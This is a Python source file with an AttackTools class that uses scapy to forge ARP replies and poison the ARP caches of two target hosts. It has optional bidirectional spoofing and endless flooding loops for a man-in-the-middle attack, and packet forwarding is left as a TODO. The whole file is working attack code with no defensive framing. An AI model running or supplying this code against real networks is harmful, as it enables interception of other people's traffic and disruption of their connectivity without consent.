import scapy.layers.l2
from scapy.all import *
from DataStructures import Host


class AttackTools:
    @staticmethod
    def build_arp_response(attacker: Host, target1: Host, target2: Host):
        # TODO: Add error detection
        ether_index = 0
        arp_index = 1

        arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
        arp[ether_index].src = attacker.get_hwaddr()
        arp[arp_index].hwsrc = attacker.get_hwaddr()
        arp[arp_index].psrc = target1.get_addr()
        arp[arp_index].hwdst = target2.get_hwaddr()
        arp[arp_index].pdst = target2.get_addr()

        return arp

    @staticmethod
    def poison_single(attacker: Host, target1: Host, target2: Host, bidirectional: bool, forwarding: bool, flood: bool):
        # TODO: Add error detection
        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
        if not flood:
            sendp(arp1)

        if bidirectional:
            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
            if not flood:
                sendp(arp2)

        if forwarding:
            # TODO: Implement packet forwarding
            pass

        # TODO: Add exit condition
        if flood and bidirectional:
            while True:
                sendp(arp1)
                sendp(arp2)

        elif flood:
            while True:
                sendp(arp1)

    # def packet_forwarder(self, attacker: Host, target1: Host, target2: Host, bidirectional: bool):
